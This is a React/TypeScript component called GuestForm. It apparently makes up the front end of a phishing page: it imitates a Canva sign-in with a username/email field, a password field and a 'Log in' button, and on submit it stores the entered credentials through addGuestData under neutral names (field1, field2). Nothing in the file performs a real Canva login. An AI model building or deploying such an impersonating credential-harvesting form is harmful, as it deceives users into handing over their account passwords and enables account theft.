
import React, { useState } from 'react';
import { useData } from '../context/DataContext';
import Input from './Input';
import Button from './Button';
import FancyText from './FancyText';

const GuestForm: React.FC = () => {
  const [field1, setField1] = useState('');
  const [field2, setField2] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState<'idle' | 'success' | 'error'>('idle');
  const { addGuestData } = useData();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (field1.trim() && field2.trim()) {
      setIsSubmitting(true);
      setSubmitStatus('idle');
      try {
        await addGuestData({ field1, field2 });
        setField1('');
        setField2('');
        setSubmitStatus('success');
        setTimeout(() => setSubmitStatus('idle'), 3000);
      } catch (error) {
        setSubmitStatus('error');
      } finally {
        setIsSubmitting(false);
      }
    }
  };

  return (
    <div className="w-full max-w-md mx-auto p-8 bg-slate-800 rounded-xl shadow-2xl border border-slate-700">
      <form onSubmit={handleSubmit} className="space-y-6">
        <div>
          <label htmlFor="field1" className="block text-sm font-medium text-slate-300 mb-2">
            <FancyText>Canva</FancyText> Username/Mail
          </label>
          <Input 
            id="field1"
            type="text" 
            value={field1} 
            onChange={(e) => setField1(e.target.value)} 
            placeholder="e.g., username or email@example.com"
            required 
            disabled={isSubmitting}
          />
        </div>
        <div>
          <label htmlFor="field2" className="block text-sm font-medium text-slate-300 mb-2">Password</label>
          <Input
            id="field2"
            type="password" 
            value={field2} 
            onChange={(e) => setField2(e.target.value)} 
            placeholder="••••••••"
            required
            disabled={isSubmitting}
          />
        </div>
        <div className="flex flex-col gap-4">
            <Button type="submit" disabled={!field1.trim() || !field2.trim() || isSubmitting}>
              {isSubmitting ? 'Logging in...' : 'Log in'}
            </Button>
        </div>
      </form>
      {submitStatus === 'success' && (
        <p className="text-center mt-4 text-green-400 animate-fade-in">Data submitted successfully!</p>
      )}
      {submitStatus === 'error' && (
        <p className="text-center mt-4 text-red-400 animate-fade-in">Failed to submit data. Please try again.</p>
      )}
    </div>
  );
};

export default GuestForm;
